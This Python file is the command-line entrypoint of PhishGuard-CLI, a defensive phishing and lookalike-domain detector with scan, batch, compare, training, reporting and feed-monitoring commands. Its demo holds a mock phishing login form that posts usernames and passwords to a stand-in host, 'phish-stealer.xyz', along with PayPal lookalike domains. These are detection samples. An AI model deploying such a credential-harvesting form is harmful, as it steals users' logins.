"""Command Line Interface entrypoint for PhishGuard-CLI."""

import argparse
import signal
import sys
import time
from typing import Any, List, Optional

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text

from phishguard import __app_name__, __version__
from phishguard.image_analyzer import compare_webpage_images
from phishguard.predictor import ModelNotFoundError, train_model
from phishguard.reporter import (
    export_to_csv,
    export_to_json,
    inspect_report_file,
    render_batch_table,
    render_scan_result,
)
from phishguard.scanner import scan_target
from phishguard.similarity import compare_two_domains
from phishguard.utils import validate_target
from phishguard.web_analyzer import compare_webpage_content

console = Console()
error_console = Console(stderr=True)


def handle_scan(
    target_raw: str,
    output_format: str = "terminal",
    output_path: Optional[str] = None,
    analyze_web: bool = False,
    whois: bool = False,
    suspicious_image: Optional[str] = None,
    genuine_image: Optional[str] = None,
) -> int:
    """Execute domain scan and format output according to user preferences."""
    try:
        scan_res = scan_target(
            target_raw,
            analyze_web=analyze_web,
            lookup_domain_whois=whois,
            suspicious_image_path=suspicious_image,
            genuine_image_path=genuine_image,
        )
    except ValueError as exc:
        print_error(f"Invalid domain '{target_raw}': {exc}", suggestion="Try: phishguard scan example.com")
        return 1
    except ModelNotFoundError as exc:
        print_error(str(exc), suggestion="Run 'phishguard train' to train the detection model first.")
        return 1
    except Exception as exc:
        print_error(f"Scan failed: {exc}", suggestion="Check domain structure and try again.")
        return 1

    # Output formatting
    if output_format == "json":
        console.print_json(data=scan_res.to_dict())
    elif output_format == "csv":
        console.print(f"domain,classification,probability,risk_level")
        console.print(
            f"{scan_res.target},{scan_res.classification},"
            f"{scan_res.phishing_probability:.4f},{scan_res.risk_level}"
        )
    else:
        render_scan_result(scan_res)

    # File export if requested
    if output_path:
        ext = output_path.lower()
        if ext.endswith(".csv"):
            export_to_csv([scan_res], output_path)
        else:
            export_to_json(scan_res.to_dict(), output_path)

    return 0


def handle_batch(
    csv_path: str,
    output_format: str = "terminal",
    output_path: Optional[str] = None,
) -> int:
    """Read a list of domains from CSV, run batch scans, and output results."""
    import os
    import pandas as pd

    if not os.path.isfile(csv_path):
        print_error(f"Batch input CSV not found: '{csv_path}'", suggestion="Provide a valid CSV file path, e.g., data/demo_domains.csv")
        return 1

    try:
        df = pd.read_csv(csv_path, comment="#")
    except Exception as exc:
        print_error(f"Malformed CSV file '{csv_path}': {exc}", suggestion="Ensure CSV contains a valid header row with 'domain' or 'url'")
        return 1

    # Detect domain column
    col_candidates = ["domain", "url", "target", "hostname"]
    domain_col = None
    for col in df.columns:
        if str(col).lower().strip() in col_candidates:
            domain_col = col
            break

    if not domain_col:
        print_error(
            f"CSV '{csv_path}' is missing a 'domain' or 'url' column.",
            suggestion=f"Found columns: {list(df.columns)}. Rename target column to 'domain'.",
        )
        return 1

    raw_domains = df[domain_col].dropna().astype(str).str.strip().tolist()
    raw_domains = [d for d in raw_domains if d]

    if not raw_domains:
        print_error(f"CSV file '{csv_path}' contains no valid domain entries.", suggestion="Add at least one domain to scan.")
        return 1

    console.print(f"[cyan]Initiating batch scan for [bold white]{len(raw_domains)}[/bold white] targets from:[/cyan] [bold]{csv_path}[/bold]\n")

    results: List[Any] = []
    failed_count = 0

    with console.status("[bold green]Scanning targets...[/bold green]"):
        for target in raw_domains:
            try:
                res = scan_target(target)
                results.append(res)
            except Exception as exc:
                failed_count += 1
                console.print(f"[dim red]✖ Skipping invalid target '{target}': {exc}[/dim red]")

    if not results:
        print_error("All domain targets in the CSV failed validation or scanning.", suggestion="Check domain syntax.")
        return 1

    # Output rendering
    if output_format == "json":
        console.print_json(data=[r.to_dict() for r in results])
    elif output_format == "csv":
        console.print("domain,classification,probability,risk_level")
        for r in results:
            console.print(f"{r.target},{r.classification},{r.phishing_probability:.4f},{r.risk_level}")
    else:
        render_batch_table(results)

    # Summary statistics
    safe_cnt = sum(1 for r in results if r.classification == "SAFE")
    susp_cnt = sum(1 for r in results if r.classification == "SUSPICIOUS")
    phish_cnt = sum(1 for r in results if r.classification == "PHISHING")

    console.print(
        f"\n[bold white]Batch Summary:[/bold white] "
        f"[green]Safe: {safe_cnt}[/green] | "
        f"[yellow]Suspicious: {susp_cnt}[/yellow] | "
        f"[red]Phishing: {phish_cnt}[/red] "
        f"(Total Evaluated: {len(results)})"
    )

    # File export
    if output_path:
        ext = output_path.lower()
        if ext.endswith(".csv"):
            export_to_csv(results, output_path)
        else:
            export_to_json([r.to_dict() for r in results], output_path)

    return 0


def _capture_and_compare_images(genuine_url: str, suspicious_url: str) -> None:
    """Auto-capture live screenshots of two sites and run visual lookalike analysis (NTRO Technique b)."""
    import os
    import tempfile

    from phishguard.screenshot import capture_screenshot

    tmp_dir = tempfile.mkdtemp(prefix="phishguard_shots_")
    gen_path = os.path.join(tmp_dir, "genuine.png")
    susp_path = os.path.join(tmp_dir, "suspicious.png")

    console.print(f"[cyan]Capturing live screenshot of genuine site:[/cyan] {genuine_url}")
    gen_cap = capture_screenshot(genuine_url, gen_path)
    console.print(f"[cyan]Capturing live screenshot of suspicious site:[/cyan] {suspicious_url}")
    susp_cap = capture_screenshot(suspicious_url, susp_path)

    if not gen_cap.success or not susp_cap.success:
        err = gen_cap.error_message or susp_cap.error_message or "Screenshot capture unavailable."
        print_error("Automated screenshot capture failed.", suggestion=err)
        return

    img_res = compare_webpage_images(gen_cap.output_path, susp_cap.output_path)
    _render_image_similarity_panel(img_res)


def handle_monitor(
    feed_source: str,
    interval_sec: int = 300,
    run_once: bool = False,
    output_dir: str = "reports/monitor",
    limit: Optional[int] = None,
    whois: bool = False,
) -> int:
    """Automated, continuous monitoring of a newly-registered-domain (NRD) feed.

    Polls an open-source NRD feed on an interval, scans each domain with the AI/ML
    detector, and writes timestamped JSON/CSV reports. Shuts down gracefully on
    SIGINT/SIGTERM so no report is left half-written.
    """
    import os
    from datetime import datetime

    from phishguard.feed import load_nrd_feed

    # Graceful shutdown via Unix signals (NTRO: automated, long-running tool)
    stop_flag = {"stop": False}

    def _request_stop(signum, _frame):
        stop_flag["stop"] = True
        console.print(f"\n[yellow]Received signal {signum}; finishing current cycle and shutting down...[/yellow]")

    previous_handlers = {}
    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            previous_handlers[sig] = signal.signal(sig, _request_stop)
        except (ValueError, OSError):
            # signal() only works in the main thread; ignore if unavailable
            pass

    os.makedirs(output_dir, exist_ok=True)
    seen_domains: set = set()
    cycle = 0

    display_banner(subtitle="AUTOMATED NRD MONITORING (NTRO 2023)")
    console.print(
        f"[dim white]Feed source:[/dim white] [bold]{feed_source}[/bold]  "
        f"[dim white]Interval:[/dim white] [bold]{interval_sec}s[/bold]  "
        f"[dim white]Mode:[/dim white] [bold]{'single-pass' if run_once else 'continuous'}[/bold]\n"
    )

    try:
        while not stop_flag["stop"]:
            cycle += 1
            try:
                domains = load_nrd_feed(feed_source, limit=limit)
            except (FileNotFoundError, ValueError) as exc:
                print_error(f"Feed load failed: {exc}", suggestion="Provide a valid NRD feed file or URL.")
                return 1

            # Only scan domains not already seen in this monitoring session
            new_domains = [d for d in domains if d not in seen_domains]
            for d in new_domains:
                seen_domains.add(d)

            console.print(
                f"[cyan]▶ Cycle {cycle}[/cyan]: feed has [bold]{len(domains)}[/bold] domains, "
                f"[bold]{len(new_domains)}[/bold] new to evaluate."
            )

            results: List[Any] = []
            flagged = 0
            with console.status("[bold green]Scanning newly registered domains...[/bold green]"):
                for target in new_domains:
                    if stop_flag["stop"]:
                        break
                    try:
                        res = scan_target(target, lookup_domain_whois=whois)
                        results.append(res)
                        if res.classification in ("PHISHING", "SUSPICIOUS"):
                            flagged += 1
                    except Exception as exc:
                        console.print(f"[dim red]✖ Skipping '{target}': {exc}[/dim red]")

            if results:
                render_batch_table(results)
                stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                json_path = os.path.join(output_dir, f"nrd_scan_{stamp}.json")
                csv_path = os.path.join(output_dir, f"nrd_scan_{stamp}.csv")
                export_to_json([r.to_dict() for r in results], json_path)
                export_to_csv(results, csv_path)
                console.print(
                    f"[bold white]Cycle {cycle} summary:[/bold white] "
                    f"[red]{flagged} flagged[/red] / {len(results)} scanned\n"
                )
            else:
                console.print("[dim]No new domains to scan this cycle.[/dim]\n")

            if run_once or stop_flag["stop"]:
                break

            # Interruptible sleep so SIGINT/SIGTERM is honored promptly
            slept = 0
            while slept < interval_sec and not stop_flag["stop"]:
                time.sleep(min(1, interval_sec - slept))
                slept += 1
    finally:
        # Restore original signal handlers
        for sig, handler in previous_handlers.items():
            try:
                signal.signal(sig, handler)
            except (ValueError, OSError):
                pass

    console.print("[green]Monitoring stopped cleanly.[/green]")
    return 0


def handle_report(report_file: str) -> int:
    """Inspect and format an existing JSON or CSV report file."""
    try:
        inspect_report_file(report_file)
        return 0
    except FileNotFoundError as exc:
        print_error(f"Report not found: {exc}", suggestion="Provide an existing .json or .csv report path")
        return 1
    except Exception as exc:
        print_error(f"Unable to read report: {exc}", suggestion="Ensure file was generated by PhishGuard in .json or .csv format")
        return 1


def handle_demo() -> int:
    """Run an automated, 100% offline demonstration scenario for college and NTRO evaluation."""
    import os

    display_banner(subtitle="LIVE EVALUATION DEMO (NTRO 2023 SPECIFICATION)")
    console.print("[dim white]Demonstrating full system workflow: AI/ML classification, brand lookalike detection, backend code/content similarity, webpage image analysis, and batch processing.[/dim white]\n")

    # Step 1: Safe Domain Scan
    console.print("[bold cyan]▶ STEP 1: Scanning Benign / Safe Domain ('wikipedia.org')[/bold cyan]")
    scan_safe = scan_target("wikipedia.org")
    render_scan_result(scan_safe)

    # Step 2: Suspicious Keyword Domain Scan
    console.print("\n[bold cyan]▶ STEP 2: Scanning Suspicious Phishing Domain ('account-verification-service-alert.net')[/bold cyan]")
    scan_phish = scan_target("account-verification-service-alert.net")
    render_scan_result(scan_phish)

    # Step 3: Brand Lookalike Scan
    console.print("\n[bold cyan]▶ STEP 3: Scanning Brand Lookalike Domain ('paypa1-security-center.com')[/bold cyan]")
    scan_lookalike = scan_target("paypa1-security-center.com")
    render_scan_result(scan_lookalike)

    # Step 4: Pairwise Domain Comparison
    console.print("\n[bold cyan]▶ STEP 4: Pairwise Domain Comparison ('paypal.com' vs 'paypa1-security-center.com')[/bold cyan]")
    handle_compare("paypal.com", "paypa1-security-center.com")

    # Step 5: Backend Code / Content Similarity (NTRO Technique a)
    console.print("\n[bold cyan]▶ STEP 5: Backend Code & Content Similarity Analysis (NTRO Technique a)[/bold cyan]")
    mock_gen_html = (
        "<html><head><title>Secure Login Portal</title></head><body>"
        "<form action='/login' method='post'>"
        "<input type='text' name='username'/><input type='password' name='password'/>"
        "<button type='submit'>Sign In</button></form></body></html>"
    )
    mock_phish_html = (
        "<html><head><title>Secure Login Portal</title></head><body>"
        "<form action='http://phish-stealer.xyz/post.php' method='post'>"
        "<input type='text' name='username'/><input type='password' name='password'/>"
        "<button type='submit'>Sign In</button></form></body></html>"
    )
    content_res = compare_webpage_content(mock_gen_html, mock_phish_html)
    _render_content_similarity_panel(content_res, "paypal.com (genuine)", "paypa1-portal.com (phishing)")

    # Step 6: Webpage Image / Visual Lookalike Analysis (NTRO Technique b)
    gen_img = "data/demo_images/genuine_login.png"
    phish_img = "data/demo_images/phishing_lookalike.png"
    if os.path.isfile(gen_img) and os.path.isfile(phish_img):
        console.print("\n[bold cyan]▶ STEP 6: Webpage Image Analysis & Visual Lookalike Probability (NTRO Technique b)[/bold cyan]")
        img_res = compare_webpage_images(gen_img, phish_img)
        _render_image_similarity_panel(img_res)

    # Step 7: Automated Batch Scan on data/demo_domains.csv
    demo_csv = "data/demo_domains.csv"
    if os.path.isfile(demo_csv):
        console.print(f"\n[bold cyan]▶ STEP 7: Automated Batch Scan on Newly Registered Domains Dataset ('{demo_csv}')[/bold cyan]")
        json_out = "reports/demo_results.json"
        csv_out = "reports/demo_results.csv"
        handle_batch(demo_csv, output_format="terminal", output_path=json_out)
        handle_batch(demo_csv, output_format="terminal", output_path=csv_out)

    # Concluding Summary Panel
    summary_text = Text()
    summary_text.append("✔ NTRO 2023 Problem Statement Evaluation Complete\n", style="bold green")
    summary_text.append("──────────────────────────────────────────────────────────────────\n", style="bright_blue")
    summary_text.append("• AI/ML Detection Model: Random Forest / Logistic Regression with probability scoring\n", style="white")
    summary_text.append("• Technique (a) Backend Code Similarity: DOM structure, form inputs & title matching\n", style="white")
    summary_text.append("• Technique (b) Web Page Image Analysis: Perceptual dHash & color palette lookalike scoring\n", style="white")
    summary_text.append("• Open Source WHOIS Database: Detection of Newly Registered Domains (NRDs <30 days)\n", style="white")
    summary_text.append("• Detection Speed: High-throughput batch evaluation (<5ms per domain offline)\n", style="white")
    summary_text.append("• Output Formats: Terminal Rich tables, JSON, and CSV export\n\n", style="white")
    summary_text.append("Generated Demo Reports:\n", style="bold yellow")
    summary_text.append("   -> reports/demo_results.json\n", style="bold cyan")
    summary_text.append("   -> reports/demo_results.csv\n\n", style="bold cyan")
    summary_text.append("Evaluator Quickstart:\n", style="bold white")
    summary_text.append("  phishguard scan paypa1-login.com --whois\n", style="dim cyan")
    summary_text.append("  phishguard compare paypal.com paypa1-login.com --content\n", style="dim cyan")
    summary_text.append("  phishguard compare paypal.com paypa1.com --image1 data/demo_images/genuine_login.png --image2 data/demo_images/phishing_lookalike.png\n", style="dim cyan")
    summary_text.append("  phishguard report reports/demo_results.json\n", style="dim cyan")

    panel = Panel(
        summary_text,
        title="[bold white]PHISHGUARD DEMO[/bold white] [green]— READY FOR EVALUATION[/green]",
        border_style="green",
        padding=(1, 2),
        expand=False,
    )
    console.print(panel)
    return 0


def _render_content_similarity_panel(res: Any, gen_label: str, susp_label: str) -> None:
    """Render backend code / content similarity results in a dedicated panel."""
    content = Text()
    content.append("GENUINE TARGET:\n", style="bold cyan")
    content.append(f"{gen_label}\n\n", style="white")

    content.append("SUSPICIOUS TARGET:\n", style="bold magenta")
    content.append(f"{susp_label}\n\n", style="white")

    content.append("BACKEND CODE & CONTENT SIMILARITY:\n", style="bold yellow")
    content.append(f"{res.content_similarity_score:.1f}% ", style="bold white")
    content.append(f"(Content Phishing Probability: {res.similarity_probability * 100:.1f}%)\n\n", style="bold yellow")

    content.append("DEEP CONTENT METRICS:\n", style="bold white")
    content.append(f" • DOM Tag Sequence Match : {res.dom_similarity:.1f}%\n", style="dim white")
    content.append(f" • Form & Inputs Layout Match: {res.form_similarity:.1f}%\n", style="dim white")
    content.append(f" • Page Title Similarity   : {res.title_similarity:.1f}%\n", style="dim white")
    content.append(f" • Text Token Overlap      : {res.text_similarity:.1f}%\n\n", style="dim white")

    content.append("DETECTED SIGNALS:\n", style="bold cyan")
    if res.signals:
        for sig in res.signals:
            content.append(f" • {sig}\n", style="yellow")
    else:
        content.append(" • No cloned code patterns detected\n", style="dim")
    content.append("\n")

    content.append("VERDICT:\n", style="bold white")
    v_style = "bold red" if "CRITICAL" in res.verdict or "SUSPICIOUS" in res.verdict else "bold green"
    content.append(f"{res.verdict}\n", style=v_style)

    panel = Panel(
        content,
        title="[bold white]PHISHGUARD[/bold white] [cyan]— BACKEND CODE & CONTENT SIMILARITY (NTRO Technique a)[/cyan]",
        border_style="bright_blue",
        padding=(1, 2),
        expand=False,
    )
    console.print(panel)


def _render_image_similarity_panel(res: Any) -> None:
    """Render webpage image visual analysis in a dedicated panel."""
    content = Text()
    content.append("GENUINE IMAGE:\n", style="bold cyan")
    content.append(f"{res.genuine_image_path}\n\n", style="white")

    content.append("SUSPICIOUS IMAGE:\n", style="bold magenta")
    content.append(f"{res.suspicious_image_path}\n\n", style="white")

    content.append("VISUAL LOOKALIKE SIMILARITY:\n", style="bold yellow")
    content.append(f"{res.similarity_score:.1f}% ", style="bold white")
    content.append(f"(Visual Lookalike Phishing Probability: {res.visual_probability_score * 100:.1f}%)\n\n", style="bold yellow")

    content.append("PERCEPTUAL METRICS:\n", style="bold white")
    content.append(f" • Structural dHash Distance: {res.dhash_distance} / 64 bits\n", style="dim white")
    content.append(f" • Color Palette & Histogram: {res.histogram_similarity:.1f}%\n\n", style="dim white")

    content.append("DETECTED SIGNALS:\n", style="bold cyan")
    if res.signals:
        for sig in res.signals:
            content.append(f" • {sig}\n", style="yellow")
    else:
        content.append(" • Distinct visual layout\n", style="dim")
    content.append("\n")

    content.append("VERDICT:\n", style="bold white")
    v_style = "bold red" if res.is_visual_lookalike else "bold green"
    content.append(f"{res.verdict}\n", style=v_style)

    panel = Panel(
        content,
        title="[bold white]PHISHGUARD[/bold white] [cyan]— WEBPAGE IMAGE & VISUAL LOOKALIKE ANALYSIS (NTRO Technique b)[/cyan]",
        border_style="bright_blue",
        padding=(1, 2),
        expand=False,
    )
    console.print(panel)


def handle_compare(
    genuine_raw: str,
    suspicious_raw: str,
    compare_content: bool = False,
    image1: Optional[str] = None,
    image2: Optional[str] = None,
    capture: bool = False,
) -> int:
    """Execute the domain comparison workflow and display rich visual results."""
    # 1. Input validation
    try:
        gen_info = validate_target(genuine_raw)
    except ValueError as exc:
        print_error(f"Invalid genuine domain '{genuine_raw}': {exc}", suggestion="Provide a valid domain, e.g., paypal.com")
        return 1

    try:
        susp_info = validate_target(suspicious_raw)
    except ValueError as exc:
        print_error(f"Invalid suspicious domain '{suspicious_raw}': {exc}", suggestion="Provide a valid domain, e.g., paypa1-login.com")
        return 1

    # 2. Perform domain lookalike comparison
    result = compare_two_domains(gen_info.original_input, susp_info.original_input)

    # 3. Format terminal output
    content = Text()
    content.append("GENUINE DOMAIN:\n", style="bold cyan")
    content.append(f"{gen_info.registered_domain or gen_info.hostname}\n\n", style="white")

    content.append("SUSPICIOUS TARGET:\n", style="bold magenta")
    content.append(f"{susp_info.registered_domain or susp_info.hostname}\n\n", style="white")

    content.append("SIMILARITY SCORE:\n", style="bold yellow")
    content.append(f"{result.similarity_score:.1f}% ", style="bold white")
    content.append("(normalized visual / lookalike score)\n\n", style="dim italic white")

    content.append("DETECTED SIGNALS:\n", style="bold cyan")
    if result.signals:
        for sig in result.signals:
            content.append(f" • {sig}\n", style="yellow")
    else:
        content.append(" • No significant lookalike patterns detected\n", style="dim")
    content.append("\n")

    content.append("VERDICT:\n", style="bold white")
    if "HIGH" in result.verdict:
        verdict_style = "bold red"
    elif "SUSPICIOUS" in result.verdict:
        verdict_style = "bold yellow"
    elif "IDENTICAL" in result.verdict:
        verdict_style = "bold green"
    else:
        verdict_style = "bold cyan"

    content.append(f"{result.verdict}\n", style=verdict_style)

    panel = Panel(
        content,
        title="[bold white]PHISHGUARD[/bold white] [cyan]— LOOKALIKE DOMAIN COMPARATOR[/cyan]",
        border_style="bright_blue",
        padding=(1, 2),
        expand=False,
    )
    console.print(panel)

    # 4. Optional Backend Code / Content Similarity (NTRO Technique a)
    if compare_content:
        console.print("\n[bold cyan]Analyzing backend code and DOM content similarity...[/bold cyan]")
        c_res = compare_webpage_content(gen_info.original_input, susp_info.original_input)
        _render_content_similarity_panel(c_res, gen_info.original_input, susp_info.original_input)

    # 5. Optional Webpage Image Analysis (NTRO Technique b) — user-supplied images
    if image1 and image2:
        console.print("\n[bold cyan]Analyzing webpage screenshots / images for visual lookalikes...[/bold cyan]")
        img_res = compare_webpage_images(image1, image2)
        _render_image_similarity_panel(img_res)

    # 6. Optional automated screenshot capture + visual comparison (NTRO Technique b)
    if capture:
        console.print("\n[bold cyan]Auto-capturing live webpage screenshots for visual lookalike analysis...[/bold cyan]")
        _capture_and_compare_images(gen_info.original_input, susp_info.original_input)

    return 0


def handle_train(dataset_path: str, model_type: str, output_model: str) -> int:
    """Execute model training and print evaluation metrics."""
    console.print(f"[cyan]Loading dataset from:[/cyan] [bold white]{dataset_path}[/bold white]")
    console.print(f"[cyan]Classifier algorithm:[/cyan] [bold yellow]{model_type.replace('_', ' ').title()}[/bold yellow]")

    with console.status("[bold green]Extracting features & training model...[/bold green]"):
        try:
            metrics = train_model(
                dataset_path=dataset_path,
                model_type=model_type,
                output_path=output_model,
            )
        except Exception as exc:
            print_error(f"Training failed: {exc}", suggestion="Verify dataset path and column format ('url', 'label')")
            return 1

    content = Text()
    content.append("Model Training Complete\n", style="bold green")
    content.append("──────────────────────────────────────────\n", style="bright_blue")
    content.append(f"Dataset Samples: {metrics['dataset_samples']} URLs\n", style="white")
    content.append(f"Train / Test Split: {metrics['train_samples']} / {metrics['test_samples']}\n\n", style="dim white")

    content.append(f"Accuracy : {metrics['accuracy']:.1f}%\n", style="bold white")
    content.append(f"Precision: {metrics['precision']:.1f}%\n", style="bold white")
    content.append(f"Recall   : {metrics['recall']:.1f}%\n", style="bold white")
    content.append(f"F1 Score : {metrics['f1_score']:.1f}%\n\n", style="bold white")

    content.append("✔ Model saved successfully to: ", style="cyan")
    content.append(f"{output_model}\n", style="bold green")

    panel = Panel(
        content,
        title="[bold white]PHISHGUARD[/bold white] [cyan]— MACHINE LEARNING PIPELINE[/cyan]",
        border_style="bright_blue",
        padding=(1, 2),
        expand=False,
    )
    console.print(panel)
    return 0


def display_banner(subtitle: Optional[str] = None) -> None:
    """Render a clean, cybersecurity-styled CLI header banner."""
    header_text = Text()
    header_text.append("🛡️  ", style="bold cyan")
    header_text.append(__app_name__.upper(), style="bold white")
    header_text.append(f" [v{__version__}]\n", style="cyan")
    header_text.append(
        "Intelligent Phishing Domain & Lookalike Detection Utility",
        style="dim white",
    )
    if subtitle:
        header_text.append(f"\n{subtitle}", style="bold yellow")

    panel = Panel(
        header_text,
        border_style="bright_blue",
        expand=False,
        padding=(0, 2),
    )
    console.print(panel)


def print_error(message: str, suggestion: Optional[str] = None) -> None:
    """Print a clean, user-friendly error box without a Python traceback."""
    err_text = Text()
    err_text.append("✖ [ERROR] ", style="bold red")
    err_text.append(message, style="white")
    if suggestion:
        err_text.append(f"\n💡 Hint: {suggestion}", style="yellow")

    error_panel = Panel(
        err_text,
        border_style="red",
        title="Command Error",
        title_align="left",
        expand=False,
    )
    error_console.print(error_panel)


def build_parser() -> argparse.ArgumentParser:
    """Build the top-level argument parser and subcommands."""
    parser = argparse.ArgumentParser(
        prog="phishguard",
        description=(
            "PhishGuard-CLI: A professional terminal application for detecting "
            "phishing domains, visual lookalikes, and typosquatting risks."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  phishguard scan example.com\n"
            "  phishguard scan paypal-secure-login-example.com --format json\n"
            "  phishguard batch data/demo_domains.csv --output reports/results.json\n"
            "  phishguard compare paypal.com paypa1-login.com\n"
            "  phishguard train --dataset data/train_dataset.csv\n"
            "  phishguard demo\n"
        ),
    )

    parser.add_argument(
        "-v", "--version",
        action="version",
        version=f"%(prog)s {__version__}",
        help="Show version information and exit",
    )

    subparsers = parser.add_subparsers(
        title="Available Commands",
        dest="command",
        metavar="<command>",
        help="Run 'phishguard <command> --help' for command-specific options",
    )

    # 1. SCAN
    scan_parser = subparsers.add_parser(
        "scan",
        help="Scan a single domain or URL for phishing indicators",
        description="Analyzes lexical structure, brand similarity, and ML phishing probability for a target.",
    )
    scan_parser.add_argument(
        "target",
        help="Domain or URL to scan (e.g., example.com, https://secure-login.net)",
    )
    scan_parser.add_argument(
        "-f", "--format",
        choices=["terminal", "json", "csv"],
        default="terminal",
        help="Output format (default: terminal)",
    )
    scan_parser.add_argument(
        "-o", "--output",
        metavar="PATH",
        help="Path to save scan result file (e.g., reports/scan_result.json)",
    )
    scan_parser.add_argument(
        "-w", "--analyze-web",
        action="store_true",
        help="Perform optional live webpage analysis (checks login inputs, forms; fails safely if offline)",
    )
    scan_parser.add_argument(
        "--whois",
        action="store_true",
        help="Query open-source WHOIS database for domain age & Newly Registered Domain (NRD) status",
    )
    scan_parser.add_argument(
        "--suspicious-image",
        metavar="PATH",
        help="Path to suspicious webpage screenshot/image for visual lookalike analysis (NTRO Technique b)",
    )
    scan_parser.add_argument(
        "--genuine-image",
        metavar="PATH",
        help="Path to genuine webpage screenshot/image baseline for visual comparison",
    )

    # 2. BATCH
    batch_parser = subparsers.add_parser(
        "batch",
        help="Scan multiple domains from a CSV file in automated batch mode",
        description="Reads a list of domains from a CSV and runs automated phishing evaluations.",
    )
    batch_parser.add_argument(
        "csv_path",
        metavar="CSV_FILE",
        help="Path to input CSV containing a 'domain' or 'url' column",
    )
    batch_parser.add_argument(
        "-f", "--format",
        choices=["terminal", "json", "csv"],
        default="terminal",
        help="Output format for batch summary (default: terminal)",
    )
    batch_parser.add_argument(
        "-o", "--output",
        metavar="PATH",
        help="Path to save batch report (e.g., reports/batch_results.json)",
    )

    # 3. COMPARE
    compare_parser = subparsers.add_parser(
        "compare",
        help="Compare a suspicious domain against a genuine brand domain",
        description="Evaluates string distance, typosquatting patterns, and lookalike risk between two domains.",
    )
    compare_parser.add_argument(
        "genuine",
        help="Legitimate domain (e.g., paypal.com)",
    )
    compare_parser.add_argument(
        "suspicious",
        help="Suspicious lookalike domain (e.g., paypa1-login.com)",
    )
    compare_parser.add_argument(
        "-c", "--content",
        action="store_true",
        help="Analyze backend code / DOM content similarity between the two webpages (NTRO Technique a)",
    )
    compare_parser.add_argument(
        "--image1",
        metavar="PATH",
        help="Path to genuine brand webpage image/screenshot (NTRO Technique b)",
    )
    compare_parser.add_argument(
        "--image2",
        metavar="PATH",
        help="Path to suspicious webpage image/screenshot (NTRO Technique b)",
    )
    compare_parser.add_argument(
        "--capture",
        action="store_true",
        help="Auto-capture live screenshots of both sites (headless Chromium) and compare them (NTRO Technique b)",
    )

    # 4. TRAIN
    train_parser = subparsers.add_parser(
        "train",
        help="Train the machine learning model on a public phishing dataset",
        description="Extracts lexical features, trains a classifier, evaluates metrics, and saves the model.",
    )
    train_parser.add_argument(
        "-d", "--dataset",
        default="data/train_dataset.csv",
        help="Path to training CSV dataset (default: data/train_dataset.csv)",
    )
    train_parser.add_argument(
        "-m", "--model-type",
        choices=["random_forest", "logistic_regression"],
        default="random_forest",
        help="ML algorithm to train (default: random_forest)",
    )
    train_parser.add_argument(
        "-o", "--output-model",
        default="models/phishguard_model.joblib",
        help="Destination path for serialized model (default: models/phishguard_model.joblib)",
    )

    # 5. REPORT
    report_parser = subparsers.add_parser(
        "report",
        help="Inspect and display an existing JSON or CSV report file",
        description="Parses a previously exported PhishGuard scan/batch report and displays a formatted summary.",
    )
    report_parser.add_argument(
        "report_file",
        help="Path to report file (.json or .csv)",
    )

    # 6. DEMO
    subparsers.add_parser(
        "demo",
        help="Run an offline, college evaluation demonstration scenario",
        description="Executes a self-contained offline demo showcasing safe, suspicious, and lookalike domain detection.",
    )

    # 7. MONITOR
    monitor_parser = subparsers.add_parser(
        "monitor",
        help="Automatically ingest a newly-registered-domain (NRD) feed and scan it on an interval",
        description=(
            "Polls an open-source NRD feed (file, URL, or .zip), auto-scans each domain with the "
            "AI/ML detector, and writes timestamped JSON/CSV reports. Runs continuously until "
            "interrupted (Ctrl+C / SIGTERM), or a single pass with --once."
        ),
    )
    monitor_parser.add_argument(
        "feed",
        metavar="FEED",
        help="NRD feed source: local .txt/.csv/.zip file, or http(s) URL to a feed/zip",
    )
    monitor_parser.add_argument(
        "-i", "--interval",
        type=int,
        default=300,
        help="Seconds between polling cycles in continuous mode (default: 300)",
    )
    monitor_parser.add_argument(
        "--once",
        action="store_true",
        help="Run a single scan pass and exit (useful for scheduled cron jobs)",
    )
    monitor_parser.add_argument(
        "-o", "--output-dir",
        default="reports/monitor",
        help="Directory for timestamped monitoring reports (default: reports/monitor)",
    )
    monitor_parser.add_argument(
        "--limit",
        type=int,
        default=None,
        help="Maximum number of domains to read from the feed per cycle",
    )
    monitor_parser.add_argument(
        "--whois",
        action="store_true",
        help="Enrich each scan with a live WHOIS domain-age / NRD lookup",
    )

    return parser


def main() -> None:
    """Main CLI entrypoint."""
    parser = build_parser()
    args = parser.parse_args()

    if not args.command:
        display_banner()
        parser.print_help()
        sys.exit(0)

    try:
        if args.command == "scan":
            code = handle_scan(
                args.target,
                output_format=args.format,
                output_path=args.output,
                analyze_web=args.analyze_web,
                whois=args.whois,
                suspicious_image=args.suspicious_image,
                genuine_image=args.genuine_image,
            )
            sys.exit(code)
        elif args.command == "batch":
            code = handle_batch(args.csv_path, args.format, args.output)
            sys.exit(code)
        elif args.command == "compare":
            code = handle_compare(
                args.genuine,
                args.suspicious,
                compare_content=args.content,
                image1=args.image1,
                image2=args.image2,
                capture=args.capture,
            )
            sys.exit(code)
        elif args.command == "train":
            code = handle_train(args.dataset, args.model_type, args.output_model)
            sys.exit(code)
        elif args.command == "report":
            code = handle_report(args.report_file)
            sys.exit(code)
        elif args.command == "demo":
            code = handle_demo()
            sys.exit(code)
        elif args.command == "monitor":
            code = handle_monitor(
                args.feed,
                interval_sec=args.interval,
                run_once=args.once,
                output_dir=args.output_dir,
                limit=args.limit,
                whois=args.whois,
            )
            sys.exit(code)
        else:
            parser.print_help()
    except KeyboardInterrupt:
        console.print("\n[yellow]Operation cancelled by user.[/yellow]")
        sys.exit(130)
    except Exception as exc:
        print_error(str(exc), suggestion="Check your command parameters or run 'phishguard --help'")
        sys.exit(1)


if __name__ == "__main__":
    main()
